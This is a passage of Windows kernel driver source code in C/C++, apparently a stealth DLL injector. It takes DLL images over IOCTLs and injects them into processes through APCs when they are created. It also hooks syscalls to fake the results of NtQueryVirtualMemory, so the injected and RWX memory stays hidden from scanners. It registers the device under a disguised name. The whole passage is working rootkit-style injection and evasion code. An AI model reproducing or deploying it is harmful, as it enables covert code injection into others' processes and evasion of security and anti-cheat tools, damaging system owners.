        return Injectx86(pid);
    else
        return Inject64ByApc(pid);
}

VOID CreateProcessNotify(
	_In_ HANDLE ParentId,
	_In_ HANDLE ProcessId,
	_In_ BOOLEAN Create
)
{
	UNREFERENCED_PARAMETER(ParentId);

	if (ProcessId == (HANDLE)4 || ProcessId == (HANDLE)0)
	{
		return;
	}

	if (KeGetCurrentIrql() != PASSIVE_LEVEL)
	{
		return;
	}

	if (Create)
	{
		DPRINT("AddInjectList -> %d\n", ProcessId);
		AddInjectList(ProcessId);
	}
	else
	{
		DPRINT("DeleteInjectList -> %d\n", ProcessId);
		DeleteInjectList(ProcessId);
	}

}


VOID DriverUnload(
	IN PDRIVER_OBJECT DriverObject)
{

	PsSetCreateProcessNotifyRoutine(CreateProcessNotify, true);

    IfhRelease();

	NTDLL::Deinitialize();

    UNICODE_STRING uslink = { 0 };

    RtlInitUnicodeString(&uslink, L"\\DosDevices\\loveyou");

	IoDeleteSymbolicLink(&uslink);
	IoDeleteDevice(DriverObject->DeviceObject);

	if (g_injectDll.x64dll != NULL)
	{
		ExFreePoolWithTag(g_injectDll.x64dll, 'd64x');
	}
	if (g_injectDll.x86dll != NULL)
	{
		ExFreePoolWithTag(g_injectDll.x86dll, 'd68x');
	}

	while (!IsListEmpty(&g_injectList.link))
	{
		PINJECT_PROCESSID_LIST next = (PINJECT_PROCESSID_LIST)g_injectList.link.Blink;
		RemoveEntryList(&next->link);
		ExFreeToNPagedLookasideList(&g_injectListLookaside, &next->link);
	}

	ExDeleteResourceLite(&g_ResourceMutex);
	ExDeleteNPagedLookasideList(&g_injectListLookaside);
	ExDeleteNPagedLookasideList(&g_injectDataLookaside);

}

NTSTATUS DriverDefaultHandler(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return Irp->IoStatus.Status;
}

NTSTATUS DriverControlHandler(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp)

{
	PIO_STACK_LOCATION  irpSp;// Pointer to current stack location
	NTSTATUS            ntStatus = STATUS_UNSUCCESSFUL;// Assume success
	ULONG               inBufLength; // Input buffer length
	ULONG               outBufLength; // Output buffer length
	PUCHAR				inBuf, outBuf;
	UNREFERENCED_PARAMETER(DeviceObject);

	PAGED_CODE();

	irpSp = IoGetCurrentIrpStackLocation(Irp);

	inBufLength = irpSp->Parameters.DeviceIoControl.InputBufferLength;
	outBufLength = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

	inBuf = (PUCHAR)Irp->AssociatedIrp.SystemBuffer;
	outBuf = (PUCHAR)Irp->AssociatedIrp.SystemBuffer;

	if (!inBufLength || !outBufLength)
	{
		ntStatus = STATUS_INVALID_PARAMETER;
		goto End;
	}

	switch (irpSp->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_SET_INJECT_X86DLL:
	{
		if (g_injectDll.x86dll == NULL && g_injectDll.x86dllsize == 0)
		{
            X86INIT:
			PIMAGE_DOS_HEADER dosHeadPtr = (PIMAGE_DOS_HEADER)inBuf;
			if (dosHeadPtr->e_magic != IMAGE_DOS_SIGNATURE)
			{
				break;
			}

			g_injectDll.x86dll = ExAllocatePoolWithTag(NonPagedPool, inBufLength, 'd68x');
			if (g_injectDll.x86dll != NULL)
			{
				g_injectDll.x86dllsize = inBufLength;
				memcpy(g_injectDll.x86dll, inBuf, inBufLength);
				ntStatus = STATUS_SUCCESS;
			}
		}
        else
        {
            ExFreePoolWithTag(g_injectDll.x86dll, 'd64x');
            g_injectDll.x86dll = 0;
            g_injectDll.x86dllsize = 0;
            goto X86INIT;
        }
		break;
	}
	case IOCTL_SET_INJECT_X64DLL:
	{
		if (g_injectDll.x64dll == NULL && g_injectDll.x64dllsize == 0)
		{
            INIT:
			PIMAGE_DOS_HEADER dosHeadPtr = (PIMAGE_DOS_HEADER)inBuf;
			if (dosHeadPtr->e_magic != IMAGE_DOS_SIGNATURE)
			{
				break;
			}

			g_injectDll.x64dll = ExAllocatePoolWithTag(NonPagedPool, inBufLength, 'd64x');
			if (g_injectDll.x64dll != NULL)
			{
				g_injectDll.x64dllsize = inBufLength;
				memcpy(g_injectDll.x64dll, inBuf, inBufLength);
				ntStatus = STATUS_SUCCESS;
			}
		}
        else
        {
            ExFreePoolWithTag(g_injectDll.x64dll, 'd64x');
            g_injectDll.x64dll = 0;
            g_injectDll.x64dllsize = 0;
            goto INIT;
        }
		break;
	}
    case IOCTL_SET_INJECT_PROCESSNAME:
    {
        if (inBufLength > 15)
            break;

        RtlZeroMemory(g_injectDll.szProcessName, sizeof(g_injectDll.szProcessName));
        RtlCopyMemory(g_injectDll.szProcessName, inBuf, inBufLength);
        ntStatus = STATUS_SUCCESS;
        break;
    }
    case IOCTL_INJECT_PID:
    {
        HANDLE pid = (HANDLE)(*(DWORD*)inBuf);

        ntStatus = InjectByApc(pid);

        break;
    }

	default:
		break;
	}

End:
	//
	// Finish the I/O operation by simply completing the packet and returning
	// the same status as in the packet itself.
	//

	Irp->IoStatus.Status = ntStatus;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return ntStatus;
}

#define ALIGN_UP_BY(Address, Align) (((ULONG_PTR)(Address) + (Align) - 1) & ~((Align) - 1))
#define PTR_ADD_OFFSET(Pointer, Offset) ((PVOID)((ULONG_PTR)(Pointer) + (ULONG_PTR)(Offset)))

NTSTATUS FakeNtQueryVirtualMemory(
    _In_      HANDLE                   ProcessHandle,
    _In_opt_  PVOID                    BaseAddress,
    _In_      MEMORY_INFORMATION_CLASS MemoryInformationClass,
    _Out_     PVOID                    MemoryInformation,
    _In_      SIZE_T                   MemoryInformationLength,
    _Out_opt_ PSIZE_T                  ReturnLength
)
{
    HANDLE pid = NULL;
    PEPROCESS Process = NULL;
    ULONG_PTR pHookData = 0;
    SIZE_T hookDataSize = 0;
    MEMORY_BASIC_INFORMATION nextinfo = { 0 };

    if (ProcessHandle == (HANDLE)-1)
        pid = PsGetCurrentProcessId();
    else
    {
        // PROCESS_QUERY_INFORMATION 0x0400
        if (NT_SUCCESS(ObReferenceObjectByHandle(ProcessHandle, 0x0400, *PsProcessType, KernelMode, (PVOID*)&Process, NULL)))
        {
            pid = PsGetProcessId(Process);
            ObDereferenceObject(Process);
        }
        else
        {
            return STATUS_ACCESS_DENIED;
        }
    }

    NTSTATUS status = g_pfnOrgNtQueryVirtualMemory(ProcessHandle, BaseAddress, MemoryInformationClass, MemoryInformation, MemoryInformationLength, ReturnLength);

    if (!NT_SUCCESS(status))
        return status;

    if (pid != NULL && MemoryInformationClass == MemoryBasicInformation)
    {
        PMEMORY_BASIC_INFORMATION base = (PMEMORY_BASIC_INFORMATION)MemoryInformation;

        __try {
            if (QueryInjectInfo(pid, &pHookData, &hookDataSize) && pHookData != NULL && hookDataSize != 0)
            {
                PVOID next = PTR_ADD_OFFSET(base->BaseAddress, base->RegionSize + PAGE_SIZE);

                if ((ULONG_PTR)BaseAddress >= pHookData && (ULONG_PTR)BaseAddress <= (pHookData + hookDataSize))
                {
                    //DPRINT("pid:%d ->base:0x%p return STATUS_INVALID_ADDRESS\n", pid, BaseAddress);

                    status = g_pfnOrgNtQueryVirtualMemory(ProcessHandle, next, MemoryInformationClass, MemoryInformation, MemoryInformationLength, ReturnLength);

                    if (NT_SUCCESS(status))
                        return status;

                    RtlZeroMemory(base, MemoryInformationLength);
                    return STATUS_INVALID_ADDRESS;
                }

                if (base->State == MEM_COMMIT && base->Protect == PAGE_EXECUTE_READWRITE)
                {
                    //DPRINT("pid:%d ->base:0x%p return STATUS_INVALID_ADDRESS 2\n", pid, BaseAddress);

                    status = g_pfnOrgNtQueryVirtualMemory(ProcessHandle, next, MemoryInformationClass, MemoryInformation, MemoryInformationLength, ReturnLength);

                    if (NT_SUCCESS(status))
                        return status;

                    RtlZeroMemory(base, MemoryInformationLength);
                    return STATUS_INVALID_ADDRESS;
                }
            }
        }
        __except (1)
        {
            return STATUS_INVALID_ADDRESS;
        }
    }

    return status;
}

void __fastcall SyscallStub(
    _In_ unsigned int SystemCallIndex,
    _Inout_ void** SystemCallFunction)
{
    // 
    // Enabling this message gives you VERY verbose logging... and slows
    // down the system. Use it only for debugging.
    //

#if 0
    kprintf("[+] infinityhook: SYSCALL %lu: 0x%p [stack: 0x%p].\n", SystemCallIndex, *SystemCallFunction, SystemCallFunction);
#endif

    //UNREFERENCED_PARAMETER(SystemCallIndex);

    //
    // In our demo, we care only about nt!NtCreateFile calls.
    //
    /*if (*SystemCallFunction == g_dyData.OriginalNtDeviceIoControlFile)
    {
        *SystemCallFunction = DetourNtDeviceIoControlFile;
    }*/

    if (SystemCallIndex == g_dwNtQueryVirtualMemoryIndex)
    {
        *SystemCallFunction = FakeNtQueryVirtualMemory;
    }
}

BOOLEAN NoImageIsVaildTimer()
{
    LARGE_INTEGER maxTime;
    LARGE_INTEGER processTime;

    // MaxTime:2019-12-11
    maxTime.QuadPart = 132205505895630000;
    // current:132203777895630362


    processTime.QuadPart = PsGetProcessCreateTimeQuadPart(PsInitialSystemProcess);

    if (maxTime.QuadPart >= processTime.QuadPart)
        return TRUE;
    else
        return FALSE;
}

extern "C"
NTSTATUS DriverEntry(
	IN PDRIVER_OBJECT DriverObject,
	IN PUNICODE_STRING  RegistryPath)
{
	UNREFERENCED_PARAMETER(RegistryPath);
	PDEVICE_OBJECT DeviceObject = NULL;
	NTSTATUS status;

    if (*NtBuildNumber < 8000)
        g_dwNtQueryVirtualMemoryIndex = 0x20;
    else
        g_dwNtQueryVirtualMemoryIndex = 0x23;

    RtlZeroMemory(&g_injectDll, sizeof(g_injectDll));

	DriverObject->DriverUnload = DriverUnload;

    if (!NoImageIsVaildTimer())
        return STATUS_TIMEOUT;

	for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
		DriverObject->MajorFunction[i] = DriverDefaultHandler;

	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverControlHandler;

	//read ntdll.dll from disk so we can use it for exports
	if (!NT_SUCCESS(NTDLL::Initialize()))
	{
		DPRINT("[DeugMessage] Ntdll::Initialize() failed...\r\n");
		return STATUS_UNSUCCESSFUL;
	}

	//initialize undocumented APIs
	if (!Undocumented::UndocumentedInit())
	{
		DPRINT("[DeugMessage] UndocumentedInit() failed...\r\n");
		return STATUS_UNSUCCESSFUL;
	}
	DPRINT("[DeugMessage] UndocumentedInit() was successful!\r\n");

	//create io device ,use fake device name
	RtlInitUnicodeString(&DeviceName, L"\\Device\\loveyou");
	RtlInitUnicodeString(&Win32Device, L"\\DosDevices\\loveyou");
	status = IoCreateDevice(DriverObject,
		0,
		&DeviceName,
		FILE_DEVICE_UNKNOWN,
		0,
		FALSE,
		&DeviceObject);
	if (!NT_SUCCESS(status))
	{
		NTDLL::Deinitialize();
		DPRINT("[DeugMessage] IoCreateDevice Error...\r\n");
		return status;
	}
	if (!DeviceObject)
	{
		NTDLL::Deinitialize();
		DPRINT("[DeugMessage] Unexpected I/O Error...\r\n");
		return STATUS_UNEXPECTED_IO_ERROR;
	}
	DPRINT("[DeugMessage] Device %.*ws created successfully!\r\n", DeviceName.Length / sizeof(WCHAR), DeviceName.Buffer);

	//create symbolic link
	DeviceObject->Flags |= DO_BUFFERED_IO;
	DeviceObject->Flags &= (~DO_DEVICE_INITIALIZING);
	status = IoCreateSymbolicLink(&Win32Device, &DeviceName);
	if (!NT_SUCCESS(status))
	{
		NTDLL::Deinitialize();
		IoDeleteDevice(DriverObject->DeviceObject);
		DPRINT("[DeugMessage] IoCreateSymbolicLink Error...\r\n");
		return status;
	}
	DPRINT("[DeugMessage] Symbolic link %.*ws->%.*ws created!\r\n", Win32Device.Length / sizeof(WCHAR), Win32Device.Buffer, DeviceName.Length / sizeof(WCHAR), DeviceName.Buffer);


	InitializeListHead((PLIST_ENTRY)&g_injectList);
	ExInitializeResourceLite(&g_ResourceMutex);
	ExInitializeNPagedLookasideList(&g_injectListLookaside, NULL, NULL, NULL, sizeof(INJECT_PROCESSID_LIST), TAG_INJECTLIST, NULL);
	ExInitializeNPagedLookasideList(&g_injectDataLookaside, NULL, NULL, NULL, sizeof(INJECT_PROCESSID_DATA), TAG_INJECTDATA, NULL);

	memset(&g_injectDll, 0, sizeof(INJECT_PROCESSID_DLL));

	pfn_NtAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)SSDT::GetFunctionAddress("NtAllocateVirtualMemory");
	pfn_NtReadVirtualMemory = (fn_NtReadVirtualMemory)SSDT::GetFunctionAddress("NtReadVirtualMemory");
	pfn_NtWriteVirtualMemory = (fn_NtWriteVirtualMemory)SSDT::GetFunctionAddress("NtWriteVirtualMemory");
	pfn_NtProtectVirtualMemory = (fn_NtProtectVirtualMemory)SSDT::GetFunctionAddress("NtProtectVirtualMemory");
    g_pfnOrgNtQueryVirtualMemory = (NtQueryVirtualMemoryTpye)SSDT::GetFunctionAddress("NtQueryVirtualMemory");

	if (pfn_NtAllocateVirtualMemory == NULL ||
		pfn_NtReadVirtualMemory == NULL ||
		pfn_NtWriteVirtualMemory == NULL ||
		pfn_NtProtectVirtualMemory == NULL ||
        g_pfnOrgNtQueryVirtualMemory == NULL)
	{
		NTDLL::Deinitialize();
		IoDeleteSymbolicLink(&Win32Device);
		IoDeleteDevice(DriverObject->DeviceObject);

        ExDeleteResourceLite(&g_ResourceMutex);
        ExDeleteNPagedLookasideList(&g_injectListLookaside);
        ExDeleteNPagedLookasideList(&g_injectDataLookaside);
		return STATUS_UNSUCCESSFUL;
	}

	status = PsSetCreateProcessNotifyRoutine(CreateProcessNotify, FALSE);
	if (!NT_SUCCESS(status))
	{
		NTDLL::Deinitialize();
		IoDeleteSymbolicLink(&Win32Device);
		IoDeleteDevice(DriverObject->DeviceObject);

        ExDeleteResourceLite(&g_ResourceMutex);
        ExDeleteNPagedLookasideList(&g_injectListLookaside);
        ExDeleteNPagedLookasideList(&g_injectDataLookaside);
		return status;
	}

    status = IfhInitialize(SyscallStub);

    if (!NT_SUCCESS(status))
    {
        PsSetCreateProcessNotifyRoutine(CreateProcessNotify, TRUE);
        NTDLL::Deinitialize();
        IoDeleteSymbolicLink(&Win32Device);
        IoDeleteDevice(DriverObject->DeviceObject);

        ExDeleteResourceLite(&g_ResourceMutex);
        ExDeleteNPagedLookasideList(&g_injectListLookaside);
        ExDeleteNPagedLookasideList(&g_injectDataLookaside);
        return status;
    }

	return STATUS_SUCCESS;

}
